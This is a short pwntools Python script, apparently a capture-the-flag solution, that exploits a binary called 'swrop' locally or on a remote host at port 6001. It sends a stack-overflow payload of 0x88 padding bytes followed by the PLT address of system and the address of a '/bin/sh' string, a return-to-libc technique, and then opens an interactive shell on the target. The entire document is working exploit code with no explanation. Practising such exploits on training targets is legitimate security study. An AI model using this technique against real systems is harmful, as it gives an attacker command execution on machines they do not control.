from pwn import *

PROG_NAME = "./swrop"
REMOTE_IP = "plsdonthaq.me"
REMOTE_PORT = 6001

if args.REMOTE:
    p = remote(REMOTE_IP, REMOTE_PORT)
    elf = ELF(PROG_NAME)
else:
    p = process(PROG_NAME, env={"LD_LIBRARY_PATH": "./libc-2.23.so"})
    elf = p.elf

payload = b'A'*0x88
payload += p32(elf.plt['system'])
payload += b'A'*4
payload += p32(0x80485f0) # address of /bin/sh string

p.sendline(payload)

p.interactive()
